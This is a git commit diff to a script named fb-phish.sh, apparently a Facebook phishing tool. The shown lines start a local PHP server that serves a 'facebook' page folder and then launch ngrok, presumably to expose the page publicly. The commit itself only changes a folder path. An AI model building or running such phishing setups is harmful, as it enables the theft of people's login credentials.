0e5f0f074cc25269cddebee0311d037fd526103d
Tutorial Mania <50166038+Tutorial-Mania@users.noreply.github.com>
2020-08-24 09:56:22 -0700

    Update fb-phish.sh

--- fb-phish.sh
+++ fb-phish.sh
@@ -42,7 +42,7 @@ pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:4444 -t .facebook/ > /dev/null 2>&1 & 
+php -S 127.0.0.1:4444 -t facebook/ > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 3
